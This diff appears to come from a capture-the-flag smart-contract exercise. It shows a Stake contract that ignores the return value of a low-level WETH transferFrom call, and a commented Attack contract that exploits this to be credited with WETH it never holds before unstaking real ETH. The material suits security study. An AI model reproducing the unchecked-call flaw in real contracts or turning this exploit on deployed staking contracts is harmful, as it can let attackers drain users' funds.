@@ -26,7 +26,7 @@ contract Stake {
         (,bytes memory allowance) = WETH.call(abi.encodeWithSelector(0xdd62ed3e, msg.sender,address(this)));
         require(bytesToUint(allowance) >= amount,"How am I moving the funds honey?");
         totalStaked += amount;
-        UserStake[msg.sender] += amount;
+        UserStake[msg.sender] += amount; // The Stake contract blindly updates your stake in this line (inside StakeWETH()):
         (bool transfered, ) = WETH.call(abi.encodeWithSelector(0x23b872dd, msg.sender,address(this),amount));
         Stakers[msg.sender] = true;
         return transfered;
@@ -51,40 +51,43 @@ contract Stake {
 
 contract Attack {
     Stake public stake;
-    WETH public weth;
+    address public weth;
 
-    constructor(WETH _weth, Stake _stake) {
+    constructor(address _weth, Stake _stake) {
         weth = _weth;
         stake = _stake;
     }
 
-    function pwn() external payable {
+    function attack() external payable {
+
+        // ...note that approve works even if u have nothing
         (bool approve, ) = address(weth).call(abi.encodeWithSignature("approve(address,uint256)", stake, type(uint256).max));
         require(approve, "approved failed");
 
+        // staking weth that i dont have but its fine since the allowance passes
         (bool stakeWeth, ) = address(stake).call(abi.encodeWithSignature("StakeWETH(uint256)", 0.001 ether + 1));
         require(stakeWeth, "stakeWeth failed");
 
+        // let us now stake some real thing
         (bool stakeEth, ) = address(stake).call{value: 0.001 ether + 2}(abi.encodeWithSignature("StakeETH()"));
         require(stakeEth, "stakeEth failed");
 
+        // unstake ur 0.001 but leaving behind some eth and wei in the contract
         (bool unstake, ) = address(stake).call(abi.encodeWithSignature("Unstake(uint256)", 0.001 ether));
-        require(unstake, "unstake failed");
+        require(unstake, "unstake failed"); 
 
     }
 
 }
 
 contract WETH is ERC20 {
-    Stake public stake;
 
-    constructor(Stake _stake) ERC20("weth", "WETH") {
-        stake = _stake;
-        _mint(msg.sender, 1000);
+    constructor() ERC20("weth", "WETH") {
+        _mint(msg.sender, 10 ether);
     }
 
-    function mint(address stake) public {
-        _mint(stake, 1000);
+    function mint(address _stake) public {
+        _mint(_stake, 10 ether);
     }
 
 }
